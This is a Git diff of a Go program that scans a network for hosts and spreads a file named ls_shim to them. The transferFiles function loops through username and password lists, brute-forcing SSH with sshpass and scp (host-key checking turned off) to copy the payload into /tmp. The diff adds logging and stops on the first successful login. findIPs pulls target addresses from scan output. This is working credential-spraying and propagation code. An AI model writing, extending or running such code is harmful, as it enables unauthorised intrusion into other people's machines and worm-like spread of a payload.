@@ -37,13 +37,35 @@ func main() {
 
 func transferFiles(ips []string) {
 	for i := 0; i < len(ips); i++ {
+		if isVerbose {
+			fmt.Println("Transferring files to " + ips[i])
+		}
 		for u := 0; u < len(usernames); u++ {
+			if isVerbose {
+				fmt.Println("Trying user " + usernames[u])
+			}
+			complete := false
 			for p := 0; p < len(passwords); p++ {
-				command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ips[i] + ":/tmp/"}
-				fmt.Println(command)
+				if isVerbose {
+					command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ips[i] + ":/tmp/"}
+					fmt.Println(command)
+				}
 				cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ips[i]+":/tmp/")
 				err := cmd.Run()
-				fmt.Println(err)
+				if err == nil {
+					if isVerbose {
+						fmt.Println("Files sent")
+					}
+					complete = true
+					break
+				}
+			}
+			if complete {
+				break
+			} else {
+				if isVerbose {
+					fmt.Println("User" + usernames[u] + " failed. Trying next user...")
+				}
 			}
 		}
 
@@ -63,11 +85,9 @@ func findIPs() []string {
 	cmd.Run()
 	ipFile, _ := os.ReadFile(".ipscan_lsshim")
 	ipStr := string(ipFile)
-	//fmt.Println(ipStr)
 	ipArr := strings.Split(ipStr, "\n")
 	for i := 0; i < len(ipArr); i++ {
 		if strings.Index(ipArr[i], "Host: ") != -1 {
-			//fmt.Println(ipArr[i])
 			ip := ipArr[i][strings.Index(ipArr[i], "Host: ")+6 : strings.Index(ipArr[i], " ()")]
 			ipList = append(ipList, ip)
 		}
